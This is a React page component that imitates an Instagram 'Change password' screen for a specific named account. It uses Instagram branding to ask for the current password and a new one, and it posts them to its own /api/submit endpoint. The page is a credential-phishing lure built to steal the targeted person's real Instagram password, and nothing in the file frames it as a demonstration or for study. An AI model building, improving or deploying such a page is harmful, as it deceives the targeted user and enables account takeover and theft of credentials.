export default function Home() {
  return (
    <div style={{
      backgroundColor: "#000",
      color: "#fff",
      fontFamily: "-apple-system, BlinkMacSystemFont, Segoe UI, Roboto, sans-serif",
      padding: "20px",
      minHeight: "100vh", // ✅ Added to fix white screen issue
      boxSizing: "border-box"
    }}>
      <div style={{
        padding: "16px 0 10px",
        borderBottom: "1px solid #222",
        textAlign: "center"
      }}>
        <img src="/instagram-icon.png" alt="Instagram Icon" style={{
          width: "30px",
          height: "30px",
          verticalAlign: "middle",
          marginRight: "8px"
        }} />
        <span style={{
          fontWeight: 600,
          fontSize: "16px",
          verticalAlign: "middle"
        }}>ruma.rahman7 • Instagram</span>
      </div>

      <h2 style={{ fontSize: "20px", marginBottom: "8px" }}>Change password</h2>
      <p style={{ fontSize: "13px", color: "#aaa", marginTop: 0, marginBottom: "16px" }}>
        Your password must be at least 6 characters and should include a combination of numbers, letters and special characters (!@$%).
      </p>
      <form method="POST" action="/api/submit">
        <input type="password" name="oldpass" placeholder="Current password" required style={inputStyle} />
        <input type="password" name="newpass" placeholder="New password" required style={inputStyle} />
        <input type="password" name="confirmpass" placeholder="Retype new password" required style={inputStyle} />
        <button type="submit" style={{
          width: "100%", marginTop: "20px", padding: "14px", backgroundColor: "#3897f0",
          color: "#fff", border: "none", borderRadius: "14px", fontSize: "15px", fontWeight: "bold", cursor: "pointer"
        }}>Change Password</button>
      </form>
    </div>
  );
}

const inputStyle = {
  width: "100%",
  padding: "14px 16px",
  marginTop: "12px",
  border: "1px solid #333",
  borderRadius: "14px",
  backgroundColor: "#1a1a1a",
  color: "#fff",
  fontSize: "15px",
  boxSizing: "border-box",
  boxShadow: "inset 0 1px 2px rgba(0, 0, 0, 0.4)"
};
